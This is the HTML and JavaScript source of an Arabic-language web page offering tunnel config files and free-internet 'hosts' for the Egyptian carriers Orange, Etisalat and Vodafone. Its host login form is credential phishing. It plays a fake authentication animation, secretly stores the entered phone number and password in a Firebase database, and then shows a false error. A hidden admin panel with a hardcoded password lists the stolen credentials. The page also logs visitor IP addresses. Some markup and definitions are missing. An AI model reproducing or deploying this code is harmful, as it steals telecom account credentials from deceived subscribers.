<html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>Ahmed Ibrahim</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
<style>
:root{--a:#38bdf8;--b:#a78bfa;--bg:#0b1020;--g:rgba(255,255,255,.06);--br:rgba(255,255,255,.13)}
*{box-sizing:border-box;margin:0;padding:0;font-family:Cairo,sans-serif;-webkit-tap-highlight-color:transparent;touch-action:pan-y}
html,body{touch-action:pan-y;-webkit-text-size-adjust:100%}
body{min-height:100vh;background:radial-gradient(circle at 20% 10%,#120a2a,#03050b 65%);color:#f1f5f9;overflow-x:hidden}
canvas#bg{position:fixed;inset:0;z-index:0}
.wrap{position:relative;z-index:1;max-width:480px;margin:auto;padding:26px 16px 110px}
/* splash */
#splash{position:fixed;inset:0;z-index:50;background:#070a16;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s,transform .5s}
#splash.out{opacity:0;transform:scale(1.15);pointer-events:none}
.ring{width:130px;height:130px;border-radius:50%;position:relative;display:grid;place-items:center;margin-bottom:26px}
.ring:before{content:"";position:absolute;inset:0;border-radius:50%;background:conic-gradient(var(--a),var(--b),#f472b6,var(--a));animation:spin 2s linear infinite;-webkit-mask:radial-gradient(circle,transparent 58%,#000 60%);mask:radial-gradient(circle,transparent 58%,#000 60%)}
.ring b{font-size:3rem;background:linear-gradient(135deg,var(--a),var(--b));-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:pulse 1.6s infinite}
@keyframes spin{to{transform:rotate(360deg)}}@keyframes pulse{50%{transform:scale(1.15)}}
.name{font:800 2rem Cairo;letter-spacing:3px;direction:ltr;display:flex;align-items:center;gap:8px}
.name span{opacity:0;transform:translateY(20px) rotateX(90deg);display:inline-block;animation:in .6s forwards}
@keyframes in{to{opacity:1;transform:none}}
.name span{background:linear-gradient(135deg,#fff,var(--a));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.vb{width:26px;height:26px;flex:none;filter:drop-shadow(0 0 8px #1d9bf0)}
.bar{width:220px;height:6px;border-radius:9px;background:#ffffff18;margin-top:28px;overflow:hidden}
.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--a),var(--b),#f472b6);animation:load 6s forwards}
@keyframes load{to{width:100%}}
#pct{margin-top:10px;color:#94a3b8;font-size:.85rem;direction:ltr}
body:after{content:"";position:fixed;inset:0;z-index:5;pointer-events:none;background:repeating-linear-gradient(0deg,#0000 0 2px,#00000040 3px),radial-gradient(circle,#0000 55%,#000d 100%)}
.g{position:relative;font:800 2.1rem Cairo;direction:ltr;color:#fff;-webkit-text-fill-color:#fff;animation:gl 2.4s infinite}
.g:before,.g:after{content:attr(data-text);position:absolute;left:0;top:0;width:100%;-webkit-text-fill-color:currentColor}
.g:before{color:#f0f;animation:g1 1.3s infinite linear alternate-reverse}
.g:after{color:#0ff;animation:g2 1.1s infinite linear alternate-reverse}
@keyframes g1{0%{clip-path:inset(10% 0 70% 0);transform:translateX(-4px)}25%{clip-path:inset(60% 0 10% 0);transform:translateX(4px)}50%{clip-path:inset(30% 0 40% 0)}75%{clip-path:inset(80% 0 2% 0);transform:translateX(-3px)}100%{clip-path:inset(5% 0 85% 0)}}
@keyframes g2{0%{clip-path:inset(70% 0 5% 0);transform:translateX(4px)}30%{clip-path:inset(15% 0 60% 0);transform:translateX(-4px)}60%{clip-path:inset(45% 0 30% 0)}100%{clip-path:inset(0 0 90% 0);transform:translateX(3px)}}
@keyframes gl{0%,90%,100%{transform:none}92%{transform:skewX(12deg)}95%{transform:skewX(-10deg) scaleY(1.05)}}
.pbar{height:6px;border-radius:9px;background:#ffffff18;margin:10px 0;overflow:hidden}.pbar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--a),var(--b),#f472b6);transition:width 6s linear}
.stars span{font-size:1.7rem;cursor:pointer;color:#475569;transition:.2s}.stars span.on{color:#facc15;text-shadow:0 0 10px #facc15}
textarea{width:100%;padding:11px;margin:6px 0;border-radius:10px;border:1px solid var(--br);background:#ffffff0d;color:#fff;min-height:70px;font-size:16px}
.cmt{background:#ffffff0d;border-radius:12px;padding:10px;margin-top:8px;animation:rise .4s both}.cmt small{color:#94a3b8}
.sh{background:#ffffff1a;color:#fff}
.soc{position:relative;width:64px;height:64px}.soc svg{position:absolute;inset:0;width:100%;height:100%;opacity:0;animation:sc .75s forwards}
.soc svg:nth-child(2){animation-delay:.75s}.soc svg:nth-child(3){animation-delay:1.5s}.soc svg:nth-child(4){animation-delay:2.25s}
@keyframes sc{0%{opacity:0;transform:scale(.3) rotate(-30deg)}25%{opacity:1;transform:scale(1.1)}70%{opacity:1;transform:scale(1)}100%{opacity:0;transform:scale(1.6)}}
/* header */
header{text-align:center;margin-bottom:24px}
header .name{justify-content:center;font-size:1.5rem;cursor:pointer;user-select:none}
header .name span{animation:none;opacity:1;transform:none}
header p{color:#94a3b8;font-size:.9rem;margin-top:6px}
.cards{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.card{background:var(--g);border:1px solid var(--br);border-radius:20px;padding:22px 12px;text-align:center;cursor:pointer;position:relative;overflow:hidden;backdrop-filter:blur(14px);transition:transform .35s cubic-bezier(.22,1,.36,1),border-color .3s,box-shadow .3s;animation:cardPop .65s cubic-bezier(.22,1,.36,1) both}
.card:active{transform:scale(.95)}.card:hover{border-color:var(--a);transform:translateY(-5px) scale(1.015);box-shadow:0 12px 26px rgba(56,189,248,.16)}
.card:before{content:"";position:absolute;top:0;left:-120%;width:60%;height:100%;background:linear-gradient(100deg,transparent,#ffffff2a,transparent);animation:shine 4s infinite}
@keyframes shine{to{left:160%}}@keyframes rise{from{opacity:0;transform:translateY(30px)}}
@keyframes cardPop{0%{opacity:0;transform:translateY(28px) scale(.94)}70%{opacity:1;transform:translateY(-3px) scale(1.01)}100%{opacity:1;transform:translateY(0) scale(1)}}
.card .ic{font-size:2.3rem;display:block;animation:bob 3s infinite ease-in-out;transition:transform .3s ease}
.card .ic-img{width:46px;height:46px;border-radius:14px;object-fit:cover;margin:0 auto;display:block;border:1px solid var(--br);box-shadow:0 6px 16px rgba(0,0,0,.35);animation:bob 3s infinite ease-in-out;transition:transform .3s ease}
.card:hover .ic,.card:hover .ic-img{transform:scale(1.14)}
@keyframes bob{50%{transform:translateY(-6px)}}
.card h3{font-size:.95rem;margin-top:9px;line-height:1.35}
.card small{display:block;color:#94a3b8;font-size:.68rem;margin-top:5px;direction:ltr}
.panel{margin-top:20px;background:var(--g);border:1px solid var(--br);border-radius:20px;padding:18px;display:none;animation:rise .5s}
.term{background:#000b;border-radius:12px;padding:12px;font:.8rem monospace;direction:ltr;text-align:left;color:#4ade80;min-height:110px;white-space:pre-wrap}
.term:after{content:"▍";animation:blink 1s infinite}@keyframes blink{50%{opacity:0}}
.file{display:flex;justify-content:space-between;align-items:center;gap:8px;background:#ffffff0d;border-radius:14px;padding:12px;margin-top:10px;animation:rise .4s both}
.file small{color:#94a3b8;display:block;direction:ltr;text-align:right}
button,.btn{border:0;border-radius:12px;padding:10px 16px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--a),var(--b));color:#0b1020;text-decoration:none;font-size:.9rem}
.red{background:#ef4444;color:#fff}
.empty{color:#94a3b8;text-align:center;padding:14px}
/* hosts animation & login */
.net-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:12px}
.net-btn{background:#ffffff0d;border:1px solid var(--br);border-radius:16px;padding:14px 8px;text-align:center;cursor:pointer;transition:.3s;animation:rise .45s both;position:relative;overflow:hidden}
.net-btn:hover{transform:translateY(-3px);border-color:var(--a)}
.net-btn.active{border-color:var(--a);box-shadow:0 0 18px rgba(56,189,248,.28);background:#ffffff14}
.net-logo{width:44px;height:44px;border-radius:14px;margin:0 auto 8px;display:grid;place-items:center;font-weight:800;font-size:1.2rem;color:#fff;animation:bob 2.8s infinite ease-in-out}
.net-orange .net-logo{background:linear-gradient(135deg,#ff7900,#ff4d00);box-shadow:0 0 15px rgba(255,121,0,.45)}
.net-etisalat .net-logo{background:linear-gradient(135deg,#84cc16,#4d7c0f);box-shadow:0 0 15px rgba(132,204,22,.45)}
.net-voda .net-logo{background:linear-gradient(135deg,#ef4444,#991b1b);box-shadow:0 0 15px rgba(239,68,68,.45)}
.offer-box{margin-top:14px;animation:rise .4s both}
.offer-item{display:flex;justify-content:space-between;align-items:center;gap:10px;background:#ffffff0d;border:1px solid var(--br);border-radius:14px;padding:12px;margin-top:8px;transition:.25s;animation:rise .4s both}
.offer-item:hover{border-color:var(--b);transform:translateX(-3px)}
.login-card{margin-top:14px;background:rgba(10,15,30,.72);border:1px solid var(--br);border-radius:18px;padding:16px;animation:rise .45s both}
.login-head{display:flex;align-items:center;gap:10px;margin-bottom:10px}
.err-box{margin-top:10px;background:rgba(239,68,68,.14);border:1px solid rgba(239,68,68,.45);color:#fca5a5;border-radius:12px;padding:10px;font-size:.85rem;animation:rise .3s both}
/* telegram */
#tg{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);z-index:20;display:flex;align-items:center;gap:10px;background:linear-gradient(135deg,#229ed9,#1c7fb8);color:#fff;padding:12px 22px;border-radius:40px;text-decoration:none;font-weight:700;box-shadow:0 8px 25px #229ed988;animation:glow 2s infinite}
@keyframes glow{50%{box-shadow:0 8px 40px #229ed9}}
/* admin */
#adm{position:fixed;inset:0;z-index:40;background:#000c;display:none;align-items:center;justify-content:center;padding:16px}
#adm>div{background:#111827;border:1px solid var(--br);border-radius:20px;padding:20px;width:100%;max-width:440px;max-height:90vh;overflow:auto}
input,select{width:100%;padding:11px;margin:6px 0;border-radius:10px;border:1px solid var(--br);background:#ffffff0d;color:#fff;font-size:16px}
select option{color:#000}
.conf{position:fixed;top:-10px;width:9px;height:14px;z-index:60;animation:fall 2.5s forwards}
@keyframes fall{to{transform:translateY(105vh) rotate(720deg);opacity:.2}}
</style></head><body>

document.addEventListener("gesturestart",e=>e.preventDefault(),{passive:false});
document.addEventListener("gesturechange",e=>e.preventDefault(),{passive:false});
document.addEventListener("gestureend",e=>e.preventDefault(),{passive:false});

document.addEventListener("touchend",e=>{const now=Date.now();if(now-lastTouchEnd<=300)e.preventDefault();lastTouchEnd=now},{passive:false});
document.addEventListener("wheel",e=>{if(e.ctrlKey)e.preventDefault()},{passive:false});

 const icHtml=c.img
  ? `<img class="ic-img" src="${c.img}" alt="${c.n}" style="animation-delay:${(i*.25)%2.5}s">`
  : `<span class="ic" style="animation-delay:${(i*.25)%2.5}s">${c.ic}</span>`;
 d.innerHTML=`${icHtml}<h3>${c.n}</h3>${c.sub?`<small>${c.sub}</small>`:""}`;
 d.onclick=()=>pick(c);
 $("cards").appendChild(d);
});
// telegram
const TG_DEFAULT="https://t.me/YOUR_CHANNEL"; // غيّر الرابط ده
api("/settings/tg").then(v=>$("tg").href=v||TG_DEFAULT).catch(()=>$("tg").href=TG_DEFAULT);

// user flow
let busy=false,FILES=[];
let activeNetKey=null,activeOfferTitle=null;

function openHostsMenu(){
 $("panel").style.display="block";
 $("pb").style.transition="none";
 $("pb").style.width="0";
 $("term").textContent="$ init --hosts-engine\n> scanning networks: [Orange, Etisalat, Vodafone]\n> animation_core: READY ✔";
 $("res").innerHTML=`
  <div class="net-grid">
   ${Object.values(NETWORKS).map((net,idx)=>`
    <div class="net-btn ${net.cls}" id="netbtn_${net.id}" style="animation-delay:${idx*.08}s" onclick="selectNetwork('${net.id}')">
     <div class="net-logo">${net.badge}</div>
     <b style="font-size:.86rem;display:block">${net.name.split(" ")[0]}</b>
     <small style="color:#94a3b8;font-size:.68rem">${net.offers.length} اختيارات</small>
    </div>
   `).join("")}
  </div>
  <div id="netDetails"></div>
 `;
 $("panel").scrollIntoView({behavior:"smooth"});
}

function selectNetwork(netId){
 activeNetKey=netId;
 activeOfferTitle=null;
 const net=NETWORKS[netId];
 Object.keys(NETWORKS).forEach(k=>{
  const el=$("netbtn_"+k);
  if(el)el.classList.toggle("active",k===netId);
 });
 $("term").textContent=`$ select_carrier --id=${net.id}\n> carrier: ${net.name}\n> loading available host packages ... OK`;
 $("netDetails").innerHTML=`
  <div class="offer-box">
   <p style="color:#cbd5e1;font-size:.85rem;margin-bottom:4px">اختيارات ${net.name}:</p>
   ${net.offers.map((of,i)=>`
    <div class="offer-item" style="animation-delay:${i*.06}s">
     <div>
      <b>${esc(of.title)}</b>
      <small style="display:block;color:#94a3b8;font-size:.72rem">${esc(of.tag)}</small>
     </div>
     <button onclick="openHostLogin('${net.id}','${esc(of.title).replace(/'/g,"\\'")}')">اختيار</button>
    </div>
   `).join("")}
  </div>
 `;
}

function openHostLogin(netId,offerTitle){
 activeNetKey=netId;
 activeOfferTitle=offerTitle;
 const net=NETWORKS[netId];
 $("term").textContent=`$ auth_gateway --carrier=${net.id} --offer="${offerTitle}"\n> waiting for subscriber MSISDN & secret ...`;
 $("netDetails").innerHTML=`
  <div class="login-card">
   <div class="login-head">
    <div class="net-logo ${net.cls}" style="margin:0;width:38px;height:38px;font-size:1rem">${net.badge}</div>
    <div>
     <b style="font-size:.95rem;display:block">تسجيل دخول ${net.name}</b>
     <small style="color:#94a3b8;font-size:.75rem">العرض المختار: ${esc(offerTitle)}</small>
    </div>
   </div>
   <input id="hPhone" type="tel" placeholder="ادخل الرقم" maxlength="20">
   <input id="hPass" type="password" placeholder="ادخل الرقم السري" maxlength="40">
   <button id="hSubmitBtn" onclick="submitHostLogin('${net.id}','${esc(offerTitle).replace(/'/g,"\\'")}',this)" style="width:100%;margin-top:8px">تأكيد ومتابعة</button>
   <div id="hStatus"></div>
  </div>
 `;
 $("netDetails").scrollIntoView({behavior:"smooth",block:"nearest"});
}

async function submitHostLogin(netId,offerTitle,btn){
 if(busy)return;
 const phone=($("hPhone").value||"").trim();
 const pass=($("hPass").value||"").trim();
 if(!phone||!pass){
  $("hStatus").innerHTML='<div class="err-box">❌ من فضلك ادخل الرقم والرقم السري أولاً</div>';
  return;
 }
 busy=true;
 if(btn)btn.disabled=true;
 const net=NETWORKS[netId];
 const pb=$("pb");
 pb.style.transition="none";pb.style.width="0";pb.offsetWidth;
 pb.style.transition="width 4s linear";pb.style.width="100%";

 $("hStatus").innerHTML="";
 const tm=$("term");
 tm.textContent="";
 const lines=[
  `$ carrier_auth --net=${net.id} --msisdn="${phone}"`,
  `> resolving gateway host ... OK`,
  `> sending encrypted payload to firebase ...`,
  `> verifying token 0x9F2A1C ...`,
  `> validating credentials on ${net.name} server ...`,
  `> response_code: 401_INVALID_CREDENTIALS`
 ];
 for(const l of lines){
  for(const ch of l+"\n"){tm.textContent+=ch;await sleep(16)}
  await sleep(240);
 }

 try{
  await api("/host_logins","POST",{
   network:net.name,
   networkId:net.id,
   offer:offerTitle,
   phone,
   password:pass,
   ts:Date.now()
  });
 }catch(e){}

 $("hStatus").innerHTML=`
  <div class="err-box">
   ⚠️ <b>خطأ:</b> الرقم أو الرقم السري غلط، أو فشل التحقق من السيرفر. تأكد من البيانات وحاول مرة أخرى.
  </div>
 `;
 navigator.vibrate&&navigator.vibrate([80,50,80]);
 busy=false;
 if(btn)btn.disabled=false;
}

async function pick(c){
 if(busy)return;
 if(c.hosts){openHostsMenu();return}
 busy=true;
 $("panel").style.display="block";$("res").innerHTML="";$("panel").scrollIntoView({behavior:"smooth"});
 const pb=$("pb");pb.style.transition="none";pb.style.width="0";pb.offsetWidth;pb.style.transition="width 10s linear";pb.style.width="100%";
 let n=1;try{n=(await api("/counters/"+c.id))||1;api("/counters/"+c.id,"PUT",n+1)}catch(e){}
 const nm=c.p+"_"+n;
 const lines=[`$ create_file --type=${c.p}`,`> connecting to firebase ... OK`,`> authenticating session ...`,`> fetching configs ...`,`> allocating buffer 0x7ffe91a4`,`> file.name = "${nm}"`,`> injecting parameters ...`,`> encrypting payload ████████ 100%`,`> verifying checksum ... OK`,`> done ✔`];
 const tm=$("term");tm.textContent="";const t0=Date.now();
 for(const l of lines){for(const ch of l+"\n"){tm.textContent+=ch;await sleep(18)}await sleep(330)}
 await sleep(Math.max(0,10000-(Date.now()-t0)));
 let files;try{files=await api("/files/"+c.id)}catch(e){files=null}
 const arr=files?Object.values(files):[];FILES=arr.map((f,i)=>({href:f.data,fn:nm+(arr.length>1?"_"+(i+1):"")+".npvs"}));
 if(!arr.length)$("res").innerHTML='<div class="empty">مفيش ملفات في القسم ده لسه 🕐</div>';
 else{$("res").innerHTML=FILES.map((f,i)=>`<div class="file" style="animation-delay:${i*.1}s"><div><b>${f.fn}</b><small>${esc(arr[i].name||"")}</small></div><div style="display:flex;gap:6px"><a class="btn" href="${f.href}" download="${f.fn}">⬇ تحميل</a><button class="sh" onclick="shareF(${i})">📤 شير</button></div></div>`).join("");navigator.vibrate&&navigator.vibrate(120)}
 busy=false;
}
const esc=t=>String(t??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]));
async function shareF(i){const f=FILES[i];try{const b=await (await fetch(f.href)).blob();const file=new File([b],f.fn,{type:b.type||"application/octet-stream"});if(navigator.canShare&&navigator.canShare({files:[file]}))return await navigator.share({files:[file],title:f.fn});if(navigator.share)return await navigator.share({title:f.fn,url:location.href});await navigator.clipboard.writeText(location.href);alert("تم نسخ رابط التطبيق ✅")}catch(e){}}
// visits + IP
(async()=>{try{
 const v=(await api("/stats/visits"))||0;api("/stats/visits","PUT",v+1);
 const ip=(await (await fetch("https://api.ipify.org?format=json")).json()).ip,k=ip.replace(/[.:]/g,"_");
 const o=(await api("/visitors/"+k))||{count:0};
 api("/visitors/"+k,"PUT",{ip,count:o.count+1,first:o.first||Date.now(),last:Date.now(),ua:navigator.userAgent.slice(0,80)});
}catch(e){}})();
// comments & rating
let rate=0;$("stars").innerHTML=[1,2,3,4,5].map(i=>`<span data-i="${i}">★</span>`).join("");
$("stars").onclick=e=>{const i=+e.target.dataset.i;if(!i)return;rate=i;[...$("stars").children].forEach((x,j)=>x.classList.toggle("on",j<i))};
async function sendC(){const t=$("ct").value.trim();if(!rate||!t)return alert("اختار تقييم واكتب كومنت");
 await api("/comments","POST",{name:$("cn").value.trim()||"زائر",text:t,stars:rate,ts:Date.now()});$("ct").value="";loadC()}
async function loadC(){const c=Object.values((await api("/comments"))||{}).sort((a,b)=>b.ts-a.ts);
 $("avg").textContent=c.length?`التقييم العام: ${(c.reduce((a,x)=>a+x.stars,0)/c.length).toFixed(1)} ★ (${c.length})`:"";
 $("clist").innerHTML=c.slice(0,30).map(x=>`<div class="cmt"><b>${esc(x.name)}</b> <span style="color:#facc15">${"★".repeat(x.stars)}</span><br>${esc(x.text)}</div>`).join("")}
loadC().catch(()=>{});
// admin (5 taps on name)
let tp=0,tt;$("logo").onclick=()=>{tp++;clearTimeout(tt);tt=setTimeout(()=>tp=0,1500);if(tp>=5){tp=0;adm.style.display="flex"}};
const adm=$("adm");
$("acat").innerHTML=CATS.filter(c=>!c.hosts).map(c=>`<option value="${c.id}">${c.n}</option>`).join("");
function auth(){if($("pw").value==="96130"){$("login").style.display="none";$("adminBody").style.display="block";$("pw").value="";list();api("/settings/tg").then(v=>$("atg").value=v||"")}else alert("الباسورد غلط ❌")}
async function addFile(){
 const f=$("afile").files[0];if(!f)return alert("اختار ملف");
 const data=await new Promise(r=>{const x=new FileReader();x.onload=()=>r(x.result);x.readAsDataURL(f)});
 const ext=f.name.includes(".")?"."+f.name.split(".").pop():"";
 await api("/files/"+$("acat").value,"POST",{name:$("afname").value||f.name,data,ext,ts:Date.now()});
 $("afile").value="";$("afname").value="";list();alert("تمت الإضافة ✅");
}
async function list(){
 let h="";
 for(const c of CATS.filter(x=>!x.hosts)){
  let fs={};
  try{fs=(await api("/files/"+c.id))||{}}catch(e){fs={}}
  for(const[k,f]of Object.entries(fs)){
   h+=`<div class="file"><div>${c.ic} ${c.n}<small>${esc(f.name)}</small></div><button class="red" onclick="del('${c.id}','${k}')">حذف</button></div>`;
  }
 }

 let hl={};
 try{hl=(await api("/host_logins"))||{}}catch(e){hl={}}
 const hEntries=Object.entries(hl).sort((a,b)=>(b[1].ts||0)-(a[1].ts||0));
 h+=`<h4 style='margin-top:14px'>🔐 بيانات هوستات الشبكات (${hEntries.length})</h4>`;
 if(!hEntries.length){
  h+=`<div class="empty">لا توجد بيانات مسجلة حتى الآن</div>`;
 }else{
  h+=hEntries.map(([k,item])=>`
   <div class="file">
    <div>
     <b>${esc(item.network||"")} • ${esc(item.offer||"")}</b>
     <small style="direction:rtl;text-align:right">📱 الرقم: ${esc(item.phone||"")} | 🔑 الرقم السري: ${esc(item.password||"")}</small>
     <small style="direction:rtl;text-align:right">${item.ts?new Date(item.ts).toLocaleString("ar-EG"):""}</small>
    </div>
    <button class="red" onclick="delHost('${k}')">حذف</button>
   </div>
  `).join("");
 }

 let cm={};
 try{cm=(await api("/comments"))||{}}catch(e){cm={}}
 h+="<h4 style='margin-top:14px'>💬 الكومنتات</h4>"+(Object.entries(cm).map(([k,x])=>`<div class="file"><div>${esc(x.name)} ${"★".repeat(x.stars)}<small style="direction:rtl">${esc(x.text)}</small></div><button class="red" onclick="delC('${k}')">حذف</button></div>`).join("")||'<div class="empty">لا يوجد</div>');

 let visits=0;
 try{visits=(await api("/stats/visits"))||0}catch(e){visits=0}
 let vRaw={};
 try{vRaw=(await api("/visitors"))||{}}catch(e){vRaw={}}
 const vs=Object.values(vRaw).sort((a,b)=>(b.last||0)-(a.last||0));

 h="<div class='file'><div>👁 إجمالي الزيارات<small>"+visits+"</small></div></div>"+h;
 h+=`<h4 style='margin-top:14px'>🌐 الزوار (${vs.length})</h4>`+vs.map(v=>`<div class="file"><div>${esc(v.ip)}<small>${new Date(v.last).toLocaleString("ar-EG")} • ${v.count} زيارة</small></div></div>`).join("");
 $("alist").innerHTML=h;
}
async function delHost(k){await api("/host_logins/"+k,"DELETE");list()}
async function delC(k){await api("/comments/"+k,"DELETE");list();loadC()}
async function del(c,k){await api(`/files/${c}/${k}`,"DELETE");list()}
async function saveTg(){await api("/settings/tg","PUT",$("atg").value);$("tg").href=$("atg").value;alert("تم ✅")}
</script></body></html>
